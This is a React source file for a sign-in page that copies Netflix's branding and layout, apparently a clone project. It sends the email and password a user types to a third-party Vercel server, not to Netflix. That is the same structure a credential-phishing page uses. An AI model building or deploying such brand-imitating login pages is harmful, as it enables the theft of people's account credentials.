import React, { useState } from 'react';
import './App.css';
import axios from 'axios';
import { useNavigate } from "react-router-dom";

function App() {
  const navigate = useNavigate();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  // Handle email input
  const handleEmail = (evt) => {
    setEmail(evt.target.value);
  };

  // Handle password input
  const handlePassword = (evt) => {
    setPassword(evt.target.value);
  };

  // Allow "Enter" key to trigger login
  const handleKeyPress = (evt) => {
    if (evt.key === 'Enter') {
      check();
    }
  };

  // Login check function
  function check() {
    axios.post("https://netflix-server-peach.vercel.app/login", {
      email: email,
      password: password
    })
      .then((data) => {
        if (data.data === true) {
          navigate("/success");
        } else {
          navigate("/fail");
        }
      })
      .catch((err) => {
        console.error("Login error:", err);
      });
  }

  return (
    <div className="min-h-screen flex items-center justify-center relative">
     <img
  src="/bg-image.jpg"
  className="absolute inset-0 w-full h-full object-cover"
  alt="background"/>

      <div className="absolute inset-0 bg-black/60"></div>
      <div className="absolute top-6 left-6 z-20 text-red-600 text-4xl font-extrabold">
        Netflix
      </div>
      <div className="z-20 w-full max-w-md bg-black/80 text-white p-8 rounded-md shadow-lg">
        <h1 className="text-3xl font-semibold mb-6">Sign In</h1>
        <div className="flex flex-col gap-4">
          <input
            type="email"
            name="email"
            placeholder="Email or phone number"
            onChange={handleEmail}
            className="bg-[#333] placeholder-gray-400 text-white px-4 py-3 rounded focus:outline-none border border-transparent focus:border-red-600"
          />

          <input
            type="password"
            name="password"
            placeholder="Password"
            onChange={handlePassword}
            onKeyPress={handleKeyPress}
            className="bg-[#333] placeholder-gray-400 text-white px-4 py-3 rounded focus:outline-none border border-transparent focus:border-red-600"
          />

          <button
            onClick={check}
            className="mt-2 bg-red-600 hover:bg-red-700 transition-colors duration-150 text-white py-3 rounded font-semibold"
          >
            Sign In
          </button>

          <div className="flex items-center justify-between text-sm text-gray-300 mt-1">
            <label className="flex items-center gap-2">
              <input type="checkbox" className="w-4 h-4 accent-red-600" />
              Remember me
            </label>
            <a href="#" className="text-gray-300 hover:underline">Need help?</a>
          </div>
        </div>

        <div className="mt-6 text-sm text-gray-400">
          New to Netflix? <a href="#" className="text-white font-semibold hover:underline">Sign up now</a>.
        </div>

        <p className="text-xs text-gray-500 mt-4">
          This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#" className="text-white hover:underline">Learn more.</a>
        </p>
      </div>
    </div>
  );
}

export default App;
